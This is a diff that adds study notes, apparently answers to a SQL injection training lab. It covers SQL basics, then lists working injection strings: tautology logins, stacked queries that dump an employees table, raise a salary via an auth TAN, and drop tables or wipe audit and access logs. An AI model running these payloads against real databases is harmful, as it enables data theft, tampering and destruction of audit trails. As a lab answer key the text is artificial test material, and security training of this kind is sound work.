@@ -1,0 +1,34 @@
+The user will demonstrate knowledge on:
+
+DML, DDL and DCL
+
+String SQL injection
+
+Numeric SQL injection
+
+How SQL injection violates the CIA triad
+
+
+Sql injection intro:
+2) select department from Employees where first_name = 'Bob' and last_name = 'Franco';
+3) update Employees set department = 'Sales' where first_name = 'Tobi' and last_name = 'Barnett';
+4) alter table Employees add phone varchar(20);
+5) grant all on grant_rights to unauthorized_user;
+
+SQL injection can be used for far more than reading the data of a single of user. The following are just a few examples of data a hacker could input to a form field (or anywhere user input is accepted) in an attempt to exploit a SQL injection vulnerability:
+
+Smith' OR '1' = '1
+results in SELECT * FROM users WHERE name = 'Smith' OR TRUE; which will return all entries from the users table
+
+Smith' OR 1 = 1; --
+results in SELECT * FROM users WHERE name = 'Smith' OR TRUE;--'; which, like the first example, will also return all entries from the users table
+
+Smith'; DROP TABLE users; TRUNCATE audit_log; --
+chains multiple SQL-Commands in order to both DROP the users table and delete all entries from the audit_log table
+
+9) ' or '1' = '1;
+10) Login count: 1
+    User_id: 1 OR 1 = 1;--
+11) 3SL99A';select * from employees;--
+12) 3SL99A';update employees set salary = '2137000' where auth_tan = '3SL99A';--
+13) ';drop table access_log;--
